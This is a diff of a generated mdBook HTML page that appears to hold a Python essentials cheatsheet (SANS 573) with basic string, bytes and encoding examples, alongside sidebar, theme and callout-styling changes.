"><a href="../../../../general/networking/networking_introduction.html"><strong aria-hidden="true">3.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/networking/cisco/index.html"><strong aria-hidden="true">3.4.2.</strong> Cisco Network Technician</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/networking/cisco/networking_basics.html"><strong aria-hidden="true">3.4.2.1.</strong> Networking Basics</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../general/processes/index.html"><strong aria-hidden="true">3.5.</strong> Processes</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/processes/bbh_process.html"><strong aria-hidden="true">3.5.1.</strong> Bug Bounty Hunting Process</a></li><li class="chapter-item "><a href="../../../../general/processes/incident_handling_process.html"><strong aria-hidden="true">3.5.2.</strong> Incident Handling Process</a></li><li class="chapter-item "><a href="../../../../general/processes/pt_process.html"><strong aria-hidden="true">3.5.3.</strong> Penetration Testing Process</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../general/programming/index.html"><strong aria-hidden="true">3.6.</strong> Programming</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/programming/assembly/assembly.html"><strong aria-hidden="true">3.6.1.</strong> Assembly</a></li><li class="chapter-item "><a href="../../../../general/programming/bash.html"><strong aria-hidden="true">3.6.2.</strong> Bash</a></li><li class="chapter-item expanded "><a href="../../../../general/programming/python/python.html"><strong aria-hidden="true">3.6.3.</strong> Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../general/programming/python/sans573/cheatsheet.html" class="active"><strong aria-hidden="true">3.6.3.1.</strong> 573 Cheatsheet</a></li></ol></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">3.7.</strong> RegEx</div></li><li class="chapter-item "><a href="../../../../general/reporting/index.html"><strong aria-hidden="true">3.8.</strong> Reporting</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/reporting/bbh_reporting.html"><strong aria-hidden="true">3.8.1.</strong> Bug Bounty</a></li><li class="chapter-item "><a href="../../../../general/reporting/pt_reporting.html"><strong aria-hidden="true">3.8.2.</strong> Penetration Test</a></li><li class="chapter-item "><a href="../../../../security_incident_reporting.html"><strong aria-hidden="true">3.8.3.</strong> Security Incident</a></li></ol></li><li class="chapter-item "><a href="../../../../general/webdev/index.html"><strong aria-hidden="true">3.9.</strong> WebDev</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/webdev/sylius.html"><strong aria-hidden="true">3.9.1.</strong> Sylius</a></li><li class="chapter-item "><a href="../../../../general/webdev/symfony.html"><strong aria-hidden="true">3.9.2.</strong> Symfony</a></li></ol></li></ol></li></ol>
-            </div>
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
             </div>
         </nav>
 
-        <!-- Track and set sidebar scroll position -->
-        <script>
-            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
-            sidebarScrollbox.addEventListener('click', function(e) {
-                if (e.target.tagName === 'A') {
-                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
-                }
-            }, { passive: true });
-            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
-            sessionStorage.removeItem('sidebar-scroll');
-            if (sidebarScrollTop) {
-                // preserve sidebar scroll position when navigating via links within sidebar
-                sidebarScrollbox.scrollTop = sidebarScrollTop;
-            } else {
-                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
-                var activeSection = document.querySelector('#sidebar .active');
-                if (activeSection) {
-                    activeSection.scrollIntoView({ block: 'center' });
-                }
-            }
-        </script>
-
         <div id="page-wrapper" class="page-wrapper">
 
             <div class="page">
-                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar-hover-placeholder"></div>
                 <div id="menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
                         <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
@@ -129,13 +125,14 @@
                             <i class="fa fa-paint-brush"></i>
                         </button>
                         <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                             <i class="fa fa-search"></i>
                         </button>
                     </div>
@@ -152,7 +149,12 @@
 
                 <div id="search-wrapper" class="hidden">
                     <form id="searchbar-outer" class="searchbar-outer">
-                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
                     </form>
                     <div id="searchresults-outer" class="searchresults-outer hidden">
                         <div id="searchresults-header" class="searchresults-header"></div>
@@ -172,16 +174,253 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="cheatsheet"><a class="header" href="#cheatsheet">Cheatsheet</a></h1>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<h1 id="cheatsheet"><a class="header" href="#cheatsheet">Cheatsheet</a></h1>
 <h2 id="5731---essential-skills-workshop"><a class="header" href="#5731---essential-skills-workshop">573.1 - Essential Skills Workshop</a></h2>
 <h3 id="strings-bytes-and-bytearrays"><a class="header" href="#strings-bytes-and-bytearrays">Strings, Bytes and Bytearrays</a></h3>
 <h4 id="raw-strings"><a class="header" href="#raw-strings">Raw Strings</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; print(r&quot;This has tabs and \t\t multiple\nlines&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; print(r"This has tabs and \t\t multiple\nlines")
 This has tabs and \t\t multiple\nlines
 # ignores the backslash having any special meaning in a string
 </code></pre>
 <h4 id="bytess"><a class="header" href="#bytess">bytes()s</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; bstr = b&quot;This is a \x62\x79\x74\x65 string \x80\x81&quot;
+<pre><code class="language-python">&gt;&gt;&gt; bstr = b"This is a \x62\x79\x74\x65 string \x80\x81"
 &gt;&gt;&gt; bstr[0],bstr[1],bstr[2],bstr[3],bstr[4],bstr[5]
 (84, 104, 105, 115, 32, 105)
 &gt;&gt;&gt; bstr[5:]
@@ -189,13 +428,13 @@ b'is a byte string \x80\x81'
 # the values in the string are treated as individual bytes and chars are interpreted as ASCII values
 </code></pre>
 <h4 id="encoding-characters"><a class="header" href="#encoding-characters">Encoding Characters</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; &quot;\x41&quot;
+<pre><code class="language-python">&gt;&gt;&gt; "\x41"
 'A'
 # single byte char
-&gt;&gt;&gt; &quot;\u0041&quot;
+&gt;&gt;&gt; "\u0041"
 'A'
 # 2-byte char
-&gt;&gt;&gt; &quot;\U00000041&quot;
+&gt;&gt;&gt; "\U00000041"
 'A'
 # 4-byte char
 </code></pre>
@@ -212,54 +451,54 @@ b'is a byte string \x80\x81'
 # ord() converts a char into an int
 </code></pre>
 <h4 id="string-methods"><a class="header" href="#string-methods">String Methods</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; a = &quot;Ah. I see you have the machine that goes 'BING'&quot;
+<pre><code class="language-python">&gt;&gt;&gt; a = "Ah. I see you have the machine that goes 'BING'"
 &gt;&gt;&gt; a.upper()
-&quot;AH. I SEE YOU HAVE THE MACHINE THAT GOES 'BING'&quot;
+"AH. I SEE YOU HAVE THE MACHINE THAT GOES 'BING'"
 # converts to all uppercase
 &gt;&gt;&gt; a.title()
-&quot;Ah. I See You Have The Machine That Goes 'Bing'&quot;
+"Ah. I See You Have The Machine That Goes 'Bing'"
 # capitalizes each word
-&gt;&gt;&gt; &quot;bing&quot; in a
+&gt;&gt;&gt; "bing" in a
 False
 # looks for substring to exist
-&gt;&gt;&gt; &quot;bing&quot; in a.lower()
+&gt;&gt;&gt; "bing" in a.lower()
 True
-&gt;&gt;&gt; a.replace(&quot;BING&quot;, &quot;GOOGLE&quot;)
-&quot;Ah. I see you have the machine that goes 'GOOGLE'&quot;
+&gt;&gt;&gt; a.replace("BING", "GOOGLE")
+"Ah. I see you have the machine that goes 'GOOGLE'"
 # replaces words, but variable does not change
 &gt;&gt;&gt; a
-&quot;Ah. I see you have the machine that goes 'BING'&quot;
+"Ah. I see you have the machine that goes 'BING'"
 &gt;&gt;&gt; a.split()
-['Ah.', 'I', 'see', 'you', 'have', 'the', 'machine', 'that', 'goes', &quot;'BING'&quot;]
+['Ah.', 'I', 'see', 'you', 'have', 'the', 'machine', 'that', 'goes', "'BING'"]
 # splits up into a list, default on whitespace
-&gt;&gt;&gt; a.find(&quot;machine&quot;)
+&gt;&gt;&gt; a.find("machine")
 23
 # locates one string inside of another and returns the char number at which the string starts
 </code></pre>
 <h4 id="len"><a class="header" href="#len">len()</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; astring = &quot;THISISASTRING&quot;
